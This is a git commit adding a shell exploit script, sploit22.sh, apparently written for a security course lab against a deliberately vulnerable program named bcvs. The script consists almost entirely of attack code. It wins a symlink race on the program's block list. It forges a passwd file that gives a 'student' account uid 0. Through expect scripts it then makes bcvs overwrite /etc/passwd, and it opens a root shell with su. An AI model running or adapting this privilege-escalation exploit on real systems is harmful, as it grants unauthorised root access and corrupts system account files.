9d4647d7ad38540cfa91efa3f6ef37e5b99745e3
Chuck55 <41636138+Chuck55@users.noreply.github.com>
2020-10-22 20:25:37 -0500

    stuff

---
+++ sploit22.sh
@@ -0,0 +1,96 @@
+#!/bin/sh
+cd /opt/bcvs
+touch subprocess.py
+touch file.txt
+cat << EOF >> subprocess.py
+import os, errno
+src ='.bcvs/block.list'
+dst = 'file.txt'
+try:
+    os.symlink(src, dst)
+except OSError as e:
+    if e.errno == errno.EEXIST:
+        os.remove(dst)
+        os.symlink(src, dst)
+    else:
+        raise e
+EOF
+
+touch run.sh 
+cat << EOF >> run.sh
+#!/bin/sh
+sleep 5
+python subprocess.py
+EOF
+
+./bcvs ci file.txt << EOF 
+"HELLO"
+EOF
+
+touch passwd
+PASSWORD="passwd"
+echo root:x:0:0::/root:/bin/bash >> $PASSWORD
+echo student:x:0:0::/root:/bin/bash >> $PASSWORD
+
+touch stuff.except
+cat << EOF >> stuff.exp
+#!/usr/bin/expect -f
+set timeout -1
+spawn ./bcvs ci passwd
+expect "Please write a SHORT explanation:\r"
+send -- "anything3\r"
+expect eof
+EOF
+
+touch firstexp.exp
+cat << EOF >> firstexp.exp
+#!/usr/bin/expect -f 
+set timeout -1
+spawn ./bcvs co file.txt
+expect "Please write a SHORT explanation:\r"
+sleep 6
+send -- "anything1\r"
+expect eof
+EOF
+
+touch secondexp.exp
+cat << EOF >> secondexp.exp
+#!/usr/bin/expect -f
+set timeout -1
+spawn ./bcvs co passwd
+expect "Please write a SHORT explanation:\r"
+send -- "anything2\r"
+expect eof 
+EOF
+
+touch thirdexp.exp
+cat << EOF >> thirdexp.exp
+#!/usr/bin/expect -f
+set timeout -1
+spawn su student
+expect "Password:"
+send -- "security\r"
+interact
+expect eof
+EOF
+
+chmod +x run.sh
+chmod +x stuff.exp
+chmod +x firstexp.exp
+./stuff.exp
+./firstexp.exp & ./run.sh
+echo YES
+chmod +x secondexp.exp
+chmod +x thirdexp.exp
+rm passwd
+ln -s /etc/passwd passwd
+echo YES
+./secondexp.exp
+./thirdexp.exp
+rm secondexp.exp
+rm thirdexp.exp
+rm firstexp.exp
+rm subprocess.py
+rm passwd
+rm file.txt
+rm stuff.exp
